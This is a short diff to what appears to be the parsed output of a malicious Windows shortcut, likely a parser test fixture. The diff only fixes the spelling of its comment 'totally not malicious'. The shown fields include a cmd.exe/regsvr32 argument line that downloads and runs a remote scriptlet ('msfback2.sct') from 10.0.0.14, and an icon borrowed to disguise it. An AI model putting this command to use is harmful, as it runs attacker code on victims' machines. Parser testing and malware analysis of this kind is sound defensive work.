@@ -54,7 +54,7 @@ Last accessed:                          10/30/2015 (00:17:34.0) [UTC]
 Long filename:                          cmd.exe
 
 [String Data]
-Comment (ASCII):                        totally not malicous
+Comment (ASCII):                        totally not malicious :-)
 Relative path (ASCII):                  C:\Windows\System32\cmd.exe
 Arguments (ASCII):                      /c regsvr32 /s /n /u /i:http://10.0.0.14:8000/msfback2.sct scrobj.dll
 Icon location (ASCII):                  C:\Windows\System32\cliconfg.exe
